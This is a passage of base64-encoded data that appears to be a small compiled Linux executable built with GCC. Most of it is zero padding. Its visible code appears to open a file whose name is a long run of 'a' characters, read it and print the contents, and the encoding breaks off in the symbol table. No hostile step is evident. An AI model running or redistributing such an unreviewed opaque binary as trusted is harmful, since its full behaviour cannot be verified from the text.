AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAByAAAAAAAAAGFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAARsDOyAAAAADAAAAFO///zwAAABk7///ZAAAACnw//98AAAAFAAAAAAAAAABelIAAXgQARsMBwiQAQAAJAAAABwAAADQ7v//UAAAAAAOEEYOGEoPC3cIgAA/GjsqMyQiAAAAABQAAABEAAAA+O7//wgAAAAAAAAAAAAAABwAAABcAAAApe///3YAAAAAQQ4QhgJDDQYCcQwHCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADARAAAAAAAAAAAAAAAAAADwEAAAAAAAAAEAAAAAAAAAfAAAAAAAAAAMAAAAAAAAAAAQAAAAAAAADQAAAAAAAACsEQAAAAAAABkAAAAAAAAAAD4AAAAAAAAbAAAAAAAAABAAAAAAAAAAGgAAAAAAAAAQPgAAAAAAABwAAAAAAAAACAAAAAAAAAD1/v9vAAAAAGACAAAAAAAABQAAAAAAAACwAwAAAAAAAAYAAAAAAAAAkAIAAAAAAAAKAAAAAAAAAJIAAAAAAAAACwAAAAAAAAAYAAAAAAAAAAMAAAAAAAAAAEAAAAAAAAACAAAAAAAAAGAAAAAAAAAAFAAAAAAAAAAHAAAAAAAAABcAAAAAAAAAcAUAAAAAAAAHAAAAAAAAAIAEAAAAAAAACAAAAAAAAADwAAAAAAAAAAkAAAAAAAAAGAAAAAAAAAD+//9vAAAAAGAEAAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAQgQAAAAAAAD5//9vAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGD4AAAAAAAAAAAAAAAAAAAAAAAAAAAAANhAAAAAAAABGEAAAAAAAAFYQAAAAAAAAZhAAAAAAAAA4QAAAAAAAAAAAAAAAAAAAR0NDOiAoRGViaWFuIDguMy4wLTYpIDguMy4wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABADgCAAAAAAAAAAAAAAAAAAAAAAAAAwACAGACAAAAAAAAAAAAAAAAAAAAAAAAAwADAJACAAAAAAAAAAAAAAAAAAAAAAAAAwAEALADAAAAAAAAAAAAAAAAAAAAAAAAAwAFAEIEAAAAAAAAAAAAAAAAAAAAAAAAAwAGAGAEAAAAAAAAAAAAAAAAAAAAAAAAAwAHAIAEAAAAAAAAAAAAAAAAAAAAAAAAAwAIAHAFAAAAAAAAAAAAAAAAAAAAAAAAAwAJAAAQAAAAAAAAAAAAAAAAAAAAAAAAAwAKACAQAAAAAAAAAAAAAAAAAAAAAAAAAwALAHAQAAAAAAAAAAAAAAAAAAAAAAAAAwAMAIAQAAAAAAAAAAAAAAAAAAAAAAAAAwANAKwRAAAAAAAAAAAAAAAAAAAAAAAAAwAOAAAgAAAAAAAAAAAAAAAAAAAAAAAAAwAPAAwhAAAAAAAAAAAAAAAAAAAAAAAAAwAQADAhAAAAAAAAAAAAAAAAAAAAAAAAAwARAAA+AAAAAAAAAAAAAAAAAAAAAAAAAwASABA+AAAAAAAAAAAAAAAAAAAAAAAAAwATABg+AAAAAAAAAAAAAAAAAAAAAAAAAwAUANg/AAAAAAAAAAAAAAAAAAAAAAAAAwAVAABAAAAAAAAAAAAAAAAAAAAAAAAAAwAWADhAAAAAAAAAAAAAAAAAAAAAA